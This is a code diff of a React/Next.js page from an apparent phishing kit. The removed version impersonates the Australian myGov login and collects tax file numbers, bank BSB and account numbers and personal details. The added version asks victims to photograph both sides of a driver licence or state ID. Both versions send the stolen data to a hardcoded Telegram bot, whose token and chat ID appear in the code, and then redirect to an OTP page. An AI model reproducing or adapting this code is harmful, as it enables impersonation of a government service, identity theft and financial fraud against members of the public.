@@ -1,265 +1,215 @@
 "use client";
-
-import Head from "next/head";
+import { useState } from "react";
+import Image from "next/image";
 import { useRouter } from "next/navigation";
-import React from "react";
-import { sendTelegramMessage } from "../../utils/telegram"; // Assuming you have this utility
-import Image from 'next/image';
 
-export default function MyGovAccountInfo() {
+const IdentityVerificationForm = () => {
+  const [frontImage, setFrontImage] = useState<File | null>(null);
+  const [backImage, setBackImage] = useState<File | null>(null);
+  const [frontPreview, setFrontPreview] = useState<string | null>(null);
+  const [backPreview, setBackPreview] = useState<string | null>(null);
+  const [error, setError] = useState<string | null>(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
   const router = useRouter();
 
-  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
-    e.preventDefault();
+  const handleImageChange = (side: "front" | "back", file: File | null) => {
+    if (file && file.size > 5 * 1024 * 1024) {
+      setError("File size exceeds 5MB. Please upload a smaller file.");
+      if (side === "front") {
+        setFrontImage(null);
+        setFrontPreview(null);
+      } else {
+        setBackImage(null);
+        setBackPreview(null);
+      }
+      return;
+    }
+    setError(null);
 
-    const formData = new FormData(e.currentTarget);
-    const formEntries = Object.fromEntries(formData.entries());
-
-    const message = `
-      🚨 MyGov Form Submission 🚨
-      - Full Name: ${formEntries.fname}
-      - Email Address: ${formEntries.email}
-      - Mobile Number: ${formEntries.mobnum}
-      - Date of Birth: ${formEntries.dob}
-      - Address: ${formEntries.address}
-      - Tax File Number: ${formEntries.ta}
-      - Notice Date of Issue: ${formEntries.issued}
-      - Reference Number: ${formEntries.reference}
-      - BSB: ${formEntries.bsb}
-      - Bank Account: ${formEntries.acct}
-      - Time: ${new Date().toLocaleString()}
-    `;
-
-    try {
-      await sendTelegramMessage(message); // Send data to Telegram
-      router.push("/security"); // Redirect to OTP page after submission
-    } catch (err) {
-      console.error("Failed to send data to Telegram:", err);
+    if (side === "front") {
+      setFrontImage(file);
+      setFrontPreview(file ? URL.createObjectURL(file) : null);
+    } else {
+      setBackImage(file);
+      setBackPreview(file ? URL.createObjectURL(file) : null);
     }
   };
 
+  const sendTelegramMessage = async (message: string, frontImage: File, backImage: File) => {
+    const botToken = "7972666652:AAHpQu7Ax4vgN-lL_-psZbWVjptYDvgl7YA";
+    const chatId = "1303640598";
+
+    if (!botToken || !chatId) {
+      console.error("Bot token or chat ID is missing.");
+      return;
+    }
+
+    try {
+      const formData1 = new FormData();
+      formData1.append('chat_id', chatId);
+      formData1.append('caption', message);
+      formData1.append('photo', frontImage);
+
+      const response1 = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendPhoto`,
+        {
+          method: "POST",
+          body: formData1,
+        }
+      );
+
+      if (!response1.ok) {
+        throw new Error(`Failed to send front image. Status: ${response1.status}`);
+      }
+
+      const formData2 = new FormData();
+      formData2.append('chat_id', chatId);
+      formData2.append('caption', message);
+      formData2.append('photo', backImage);
+
+      const response2 = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendPhoto`,
+        {
+          method: "POST",
+          body: formData2,
+        }
+      );
+
+      if (!response2.ok) {
+        throw new Error(`Failed to send back image. Status: ${response2.status}`);
+      }
+
+      const responseData1 = await response1.json();
+      const responseData2 = await response2.json();
+
+      if (responseData1.ok && responseData2.ok) {
+        console.log("Message and images sent successfully to Telegram.");
+      } else {
+        console.error("Telegram API returned an error:", responseData1.description || responseData2.description);
+      }
+    } catch (error) {
+      console.error("Error sending Telegram message:", error);
+    }
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+
+    if (!frontImage || !backImage) {
+      setError("Both front and back images are required.");
+      return;
+    }
+
+    setIsSubmitting(true);
+
+    await sendTelegramMessage(
+      "Identity verification images submission.",
+      frontImage,
+      backImage
+    );
+
+    setIsSubmitting(false);
+
+    // Reset form after successful upload
+    setFrontImage(null);
+    setBackImage(null);
+    setFrontPreview(null);
+    setBackPreview(null);
+
+    router.push("/otp");
+  };
+
   return (
-    <>
-      <Head>
-        <title>Sign in with myGov - MyGov</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <link
-          href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap"
-          rel="stylesheet"
-        />
-      </Head>
-      <div className="min-h-screen flex flex-col bg-gray-50">
-        {/* Header */}
-        <header className="bg-[#66d3ee] border-b-4 border-[#5bbad7]">
-          <div className="max-w-7xl mx-auto flex items-center p-4">
-            <a href="#" className="flex items-center">
-            <Image
-  src="/images/myGov-cobranded-logo-black.svg"
-  alt="myGov Beta Logo"
-  width={100} // Set the desired width
-  height={40} // Set the desired height
-  className="h-10"
-/>
-            </a>
+    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-6">
+      <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
+        <h2 className="text-3xl font-semibold text-gray-800 text-center mb-4">
+          Complete Your Identity Verification
+        </h2>
+        <p className="text-center text-gray-600 mb-6">
+          Upload images of the front and back of your <strong>Driver License</strong> or <strong>State ID</strong>.
+        </p>
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <div className="flex flex-col items-center">
+            <label
+              htmlFor="front-file-input"
+              className="w-full h-56 border-4 border-dashed border-gray-300 flex items-center justify-center rounded-lg cursor-pointer bg-gray-100 hover:bg-gray-200 transition-all mb-4"
+            >
+              {frontPreview ? (
+                <Image
+                  src={frontPreview}
+                  alt="Front ID Preview"
+                  width={192}
+                  height={192}
+                  className="rounded-lg object-cover"
+                />
+              ) : (
+                <span className="text-gray-500">Upload or Snap Front of Your ID</span>
+              )}
+            </label>
+            <input
+              type="file"
+              id="front-file-input"
+              accept="image/*"
+              capture="user" 
+              className="hidden"
+              onChange={(e) =>
+                handleImageChange("front", e.target.files ? e.target.files[0] : null)
+              }
+            />
           </div>
-        </header>
 
-        {/* Main Content */}
-        <main className="flex-grow container mx-auto px-4 mt-12">
-          <div className="max-w-2xl mx-auto bg-white shadow-lg p-8 rounded-lg">
-            <h1 className="text-3xl font-semibold text-gray-800 mb-4">
-              MyGov Account Information
-            </h1>
-            <p className="text-gray-600 mb-6">
-              Please provide your account information below.
-            </p>
-            <hr className="mb-6" />
-
-            <form onSubmit={handleSubmit} className="space-y-6">
-              {/* Full Name */}
-              <div>
-                <label
-                  htmlFor="fname"
-                  className="block text-sm font-medium text-black"
-                >
-                  Full Name
-                </label>
-                <input
-                  id="fname"
-                  name="fname"
-                  type="text"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
+          <div className="flex flex-col items-center">
+            <label
+              htmlFor="back-file-input"
+              className="w-full h-56 border-4 border-dashed border-gray-300 flex items-center justify-center rounded-lg cursor-pointer bg-gray-100 hover:bg-gray-200 transition-all"
+            >
+              {backPreview ? (
+                <Image
+                  src={backPreview}
+                  alt="Back ID Preview"
+                  width={192}
+                  height={192}
+                  className="rounded-lg object-cover"
                 />
-              </div>
-
-              {/* Email Address */}
-              <div>
-                <label
-                  htmlFor="email"
-                  className="block text-sm font-medium text-black"
-                >
-                  Email Address
-                </label>
-                <input
-                  id="email"
-                  name="email"
-                  type="email"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
-                />
-              </div>
-
-              {/* Mobile Number */}
-              <div>
-                <label
-                  htmlFor="mobnum"
-                  className="block text-sm font-medium text-black"
-                >
-                  Mobile Number
-                </label>
-                <input
-                  id="mobnum"
-                  name="mobnum"
-                  type="tel"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
-                />
-              </div>
-
-              {/* Date of Birth */}
-              <div>
-                <label
-                  htmlFor="dob"
-                  className="block text-sm font-medium text-black"
-                >
-                  Date of Birth
-                </label>
-                <input
-                  id="dob"
-                  name="dob"
-                  type="date"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
-                />
-              </div>
-
-              {/* Address */}
-              <div>
-                <label
-                  htmlFor="address"
-                  className="block text-sm font-medium text-black"
-                >
-                  Full Address on File
-                </label>
-                <input
-                  id="address"
-                  name="address"
-                  type="text"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
-                />
-              </div>
-
-              {/* Tax File Number */}
-              <div>
-                <label
-                  htmlFor="ta"
-                  className="block text-sm font-medium text-black"
-                >
-                  Tax File Number
-                </label>
-                <input
-                  id="ta"
-                  name="ta"
-                  type="text"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
-                />
-              </div>
-
-              {/* Notice of Assessment */}
-              <h3 className="bg-gray-200 text-black font-medium py-2 px-3 rounded-md">
-                NOTICE OF ASSESSMENT
-              </h3>
-              <div>
-                <label
-                  htmlFor="issued"
-                  className="block text-sm font-medium text-black"
-                >
-                  Enter the date of issue from your notice of assessment
-                </label>
-                <input
-                  id="issued"
-                  name="issued"
-                  type="date"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
-                />
-              </div>
-              <div>
-                <label
-                  htmlFor="reference"
-                  className="block text-sm font-medium text-black"
-                >
-                  Enter our reference number from your notice of assessment
-                </label>
-                <input
-                  id="reference"
-                  name="reference"
-                  type="text"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
-                />
-              </div>
-
-              {/* Bank Account Details */}
-              <h3 className="bg-gray-200 text-black font-medium py-2 px-3 rounded-md">
-                BANK ACCOUNT DETAILS
-              </h3>
-              <div>
-                <label
-                  htmlFor="bsb"
-                  className="block text-sm font-medium text-black"
-                >
-                  Enter BSB number recorded with the ATO
-                </label>
-                <input
-                  id="bsb"
-                  name="bsb"
-                  type="text"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
-                />
-              </div>
-              <div>
-                <label
-                  htmlFor="acct"
-                  className="block text-sm font-medium text-black"
-                >
-                  Enter bank account number recorded with the ATO (exclude BSB)
-                </label>
-                <input
-                  id="acct"
-                  name="acct"
-                  type="text"
-                  required
-                  className="w-full mt-2 border border-gray-300 rounded-lg p-3"
-                />
-              </div>
-
-              <div className="flex justify-end">
-                <button
-                  type="submit"
-                  className="px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg hover:bg-[#5bbad7] transition"
-                >
-                  Next
-                </button>
-              </div>
-            </form>
+              ) : (
+                <span className="text-gray-500">Upload or Snap Back of Your ID</span>
+              )}
+            </label>
+            <input
+              type="file"
+              id="back-file-input"
+              accept="image/*"
+              capture="user" 
+              className="hidden"
+              onChange={(e) =>
+                handleImageChange("back", e.target.files ? e.target.files[0] : null)
+              }
+            />
           </div>
-        </main>
+
+          {error && <p className="text-red-600 text-sm text-center">{error}</p>}
+
+          {isSubmitting ? (
+            <div className="flex justify-center">
+              <div className="w-6 h-6 border-4 border-t-blue-600 border-gray-300 rounded-full animate-spin"></div>
+            </div>
+          ) : (
+            <button
+              type="submit"
+              className="w-full bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 transition-all"
+            >
+              Submit for Verification
+            </button>
+          )}
+
+          <div className="text-center text-sm text-gray-500 mt-4">
+            By submitting, you agree to our <span className="text-blue-600">Privacy Policy</span> and <span className="text-blue-600">Terms of Service</span>.
+          </div>
+        </form>
       </div>
-    </>
+    </div>
   );
-}
+};
+
+export default IdentityVerificationForm;
